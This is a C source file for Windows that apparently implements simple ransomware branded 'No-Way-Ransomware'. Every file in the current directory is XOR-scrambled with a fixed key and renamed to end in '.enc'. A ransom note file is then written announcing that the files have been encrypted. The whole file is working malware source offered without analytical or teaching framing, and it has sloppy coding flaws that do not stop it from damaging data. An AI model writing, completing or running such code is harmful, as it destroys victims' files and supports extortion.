#include <stdio.h>
#include <windows.h> 
#include <direct.h>

#define DESTINATION_DIR ".\\"
#define ENCRYPTED_FILE_NAME ".enc"
#define CONF_FILE_NAME "readme_encrypted_files.txt"
void EncryptFile(char* filename) 
{ 
    FILE* fp = fopen(filename, "r+b"); 
  
    if (fp == NULL) 
        return; 
    fseek(fp,0,SEEK_END);
    int size = ftell(fp); 
    char* content = (char*)malloc(sizeof(char)*size);  
    rewind(fp); 

    int result = fread(content,1,size,fp); 
    if (result != size) 
    { 
        printf("Error reading the file\n"); 
        return; 
    }
    for (int i=0; i<size; i++) 
        content[i] = content[i] ^ 0x45; 
    rewind(fp); 
    fwrite(content,1,size,fp); 
    fclose(fp); 
} 

int main(int argc, char* argv[]) 
{
    char filePath[MAX_PATH];
    _getcwd(filePath, MAX_PATH);

    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", filePath);
    
    WIN32_FIND_DATA fd; 
    HANDLE hFind = ::FindFirstFile(searchPath, &fd); 
    if(hFind != INVALID_HANDLE_VALUE) 
    { 
        do { 
            char fileFullPath[MAX_PATH];
            sprintf(fileFullPath, "%s\\%s", filePath, fd.cFileName);
            if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
            { 
            } else { 
                printf("Encrypting %s :\n", fd.cFileName); 
                EncryptFile(fileFullPath); 
                char newFileName[MAX_PATH];
                int len = strlen(fd.cFileName);
                memcpy(newFileName, fd.cFileName, len - 3); 
                memcpy(newFileName + len - 3, ENCRYPTED_FILE_NAME, 5);
                char newFileFullPath[MAX_PATH];
                sprintf(newFileFullPath, "%s\\%s", filePath, newFileName);
                int result = rename(fileFullPath, newFileFullPath);
                if (result == 0) {
                    printf("[!] Encrypted\n");
                } else {
                    printf("Error encrypting the file.\n");
                }
            } 
        }while(::FindNextFile(hFind, &fd)); 
         ::FindClose(hFind); 
        char confPath[MAX_PATH];
        sprintf(confPath, "%s\\%s", filePath, CONF_FILE_NAME);

        FILE *fptr = fopen(confPath, "w");
        if (fptr == NULL) {
            printf("Error creating readme file\n");
            return -1;
        }
        char message[] = "All your files has b33n 3ncrypt3d by No-Way-Ransomware.\n";
        fprintf(fptr, "%s", message);
        fclose(fptr);
        CopyFile(confPath, DESTINATION_DIR, FALSE);

    }
    return 0;
}
